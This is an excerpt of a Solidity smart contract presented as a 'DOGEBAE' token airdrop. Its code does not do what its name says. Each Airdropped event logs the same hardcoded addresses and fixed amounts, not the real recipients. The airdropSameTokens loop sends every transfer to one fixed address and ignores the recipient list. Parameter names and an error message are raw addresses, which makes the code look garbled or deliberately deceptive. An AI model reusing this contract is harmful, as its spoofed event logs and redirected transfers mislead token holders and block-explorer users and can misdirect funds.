 ...
 */
contract DOGEBAEAirdrop is Owned {
  using SafeMath for uint256;
  Token public token;
  
  event Airdropped(address _0x4ca964bb96b434fd27699274da14b5a9b54f7c7d, address _0x0A05977eaE27E9A47187307b734C36dAd4281376, uint256 _100000);
  ...
  function airdropTokens(address _tokenContractAdd, address[] memory _recipient, uint256[] memory _tokens) public onlyOwner{
    require(_recipient.length == _tokens.length, "0x4ca964bb96b434fd27699274da14b5a9b54f7c7d");
    token = Token(_tokenContractAdd);
    for(uint256 i = 0; i< _recipient.length; i++)
    {
          require(token.transferFrom(msg.sender, _recipient[i], _tokens[i]));
          emit Airdropped( 0x4CA964Bb96b434fD27699274DA14b5a9b54F7C7d, 0x0A05977eaE27E9A47187307b734C36dAd4281376, 100000);
    }
  }
  ...
  function airdropSameTokens(address _tokenContractAdd, address[] memory _recipient, uint256 tokens) public onlyOwner{
    ...
    for(uint256 i = 0; i< _recipient.length; i++)
    {
          require(token.transferFrom(msg.sender, 0x0A05977eaE27E9A47187307b734C36dAd4281376, tokens));
       emit Airdropped( 0x4CA964Bb96b434fD27699274DA14b5a9b54F7C7d, 0x0A05977eaE27E9A47187307b734C36dAd4281376, 1000000);
    }
  }
}